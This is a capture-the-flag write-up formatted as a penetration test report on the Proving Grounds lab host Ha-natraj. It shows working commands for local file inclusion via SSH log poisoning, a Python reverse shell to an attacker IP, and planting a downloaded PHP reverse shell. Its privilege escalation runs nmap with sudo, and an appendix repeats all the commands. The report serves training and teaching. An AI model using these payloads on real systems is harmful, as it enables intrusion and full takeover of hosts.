# Penetration Test Report for Proving Grounds - Ha-natraj
- **Author:** Joey Melo
- **Date:** March 20, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.189.80 (Ha-natraj)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the Ha-natraj network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the Ha-natraj network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the Ha-natraj network. When performing the attacks, the tester was able to gain access to the machine, primarily due to a misconfigured php file in the HTTP server which allows the user to read internal files and poison SSH logs. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
Note: The machine's IP will differ in the screenshots below due to service resets throughout the test.
## Service Enumeration
### Port Scan Results
- **TCP:** 22,80
## Initial Access
### Vulnerability Explanation
The HTTP server has an exposed misconfigured php file which allows an attacker to read internal files and poison SSH logs.
### Vulnerability Fix
Remove the vulnerable php file or harden its configurations to ensure proper input sanitization.
### Attack Walkthrough
The attacker uncovered a */console* directory in the http through a bruteforce attack, which revealed an interesting *file.php* file.
```bash
gobuster dir -u http://192.168.54.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -o directories.txt
```

![/console directory](https://imgur.com/kObmWS7.png)

Knowing it's a php file, the tester then proceeded to fuzz for parameters which could potentially lead to local file inclusion or remote code execution. The tester identified that the parameter *file* was accepted and would include the contents of */etc/passwd* in the request.
```bash
ffuf -u 'http://192.168.54.80/console/file.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -fl 1
``` 

![Local file inclusion detected](https://imgur.com/RreZjic.png)

With the vulnerability uncovered, the tester utilized a list of common linux files to attempt to retrieve sensitive information. One of the files retrieved was the */var/log/auth.log* which contained the logs of the SSH service. The tester abused this finding by poisoning the log and requesting in back to obtain a reverse shell in the system.
```bash
ssh '<?php system($_GET["cmd"]);?>'@192.168.113.80 # to poison ssh log files
curl 'http://192.168.113.80/console/file.php?file=/var/log/auth.log&cmd=id' -o - # validate exploit
nc -lvnp 1337
## On browser:
http://192.168.88.80/console/file.php?file=/var/log/auth.log&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.189%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/8ANqKJj.png)

## Privilege Escalation
### Vulnerability Explanation
The remote host is running weak configurations on the */etc/apache2/apache2.conf* file, which allows a low-privileged user to write to it. The *www-data* user also has permission to restart the apache2 service, making it easier for exploitation since the attacker would not need to wait for someone to trigger the exploit.
The mahakal user is able to run *nmap* with high privileges, which can be abused to elevate privileges.
### Vulnerability Fix
Remove write permissions from the */etc/apache2/apache2.conf* file for low-privileged users and consider not allowing regular users to run *nmap* with elevated privileges.
### Attack Walkthrough
After establishing a foothold on the target, the tester noticed that the *www-data* user had privileges to restart the apache2 service.

![User can start, stop or restart the apache2 service as root without password](https://imgur.com/UN9jd9Y.png)

With this in mind, the tester started enumerating the service and its directory and verified that the */etc/apache2/apache2.conf* was writable by the current user.
```bash
find /etc -type f -writable 2>/dev/null
```

![The apache configuration file is writable by the user](https://imgur.com/jQTtx0F.png)

Two users were identified in the */etc/passwd*: mahakal and natraj. The tester poisoned the apache2 configuration file and uploaded a backdoor in the HTTP server to regain access to the machine as the *mahakal* user, which was verified to have permissions to run *nmap* with elevated privileges.
```bash
# Backdoor and service restart
wget http://192.168.49.189/php-reverse-shell.php
mv php-reverse-shell.php /var/www/html/revshell.php
/bin/systemctl restart apache2

# Commands as mahakal user to obtain root access
sudo -l
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

![Poisoning apache2.conf files](https://imgur.com/L4q4Lp5.png)

![Obtaining root access](https://imgur.com/bWWjvVG.png)

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/LGzTBnS.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.54.80
gobuster dir -u http://192.168.54.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -o directories.txt

# Fuzzing for LFI
ffuf -u 'http://192.168.54.80/console/file.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -fl 1
./lfi-fuzz.py /usr/share/wordlists/rfi-lfi-list.txt # my custom wordlist. You can build your own with information in the web

# Exploit
ssh '<?php system($_GET["cmd"]);?>'@192.168.113.80 # to poison ssh log files
curl 'http://192.168.113.80/console/file.php?file=/var/log/auth.log&cmd=id' -o - # validate exploit
nc -lvnp 1337
## On browser:
http://192.168.88.80/console/file.php?file=/var/log/auth.log&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.189%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27

# Initial Access
cd /var/www
cat local.txt

# Privilege Escalation
find /etc -type f -writable 2>/dev/null
nano /etc/apache2/apache2.conf # edit User and Group lines to contain User mahakal and Group mahakal
## On kali:
cp /usr/share/webshells/php/php-reverse-shell.php .
nano php-reverse-shell.php # edit ip and port (I used port 5555)
python3 -m http.server 80
nc -lvnp 5555
## On host:
wget http://192.168.49.189/php-reverse-shell.php
mv php-reverse-shell.php /var/www/html/revshell.php
/bin/systemctl restart apache2
## On kali:
curl http://192.168.189.80/revshell.php
## On host:
sudo -l
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

# Post-Exploitation
id
cd /root
cat proof.txt
ifconfig
```
